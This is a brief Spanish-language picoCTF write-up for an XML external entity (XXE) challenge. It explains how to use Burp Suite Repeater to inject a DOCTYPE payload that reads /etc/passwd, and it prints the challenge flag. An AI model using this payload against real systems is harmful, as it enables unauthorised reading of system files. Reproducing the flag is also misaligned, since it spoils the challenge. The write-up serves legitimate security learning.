
### Descripción 
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.
### Solución
Tenemos que interpectar una solicitud post, la enviamos al repetidor y agregamos el siguiente payload para leer el archivo etc/password, nos apoyamso de burp suite
	<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  
Solución: **picoCTF{XML_3xtern@l_3nt1t1ty_540f4f1e}**
### Notas adicionales
XXE es una vulnerabilidad que afecta a los parsers XML mal configurados

### Referencias 
https://www.youtube.com/watch?v=b1pGlutUL34&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=67
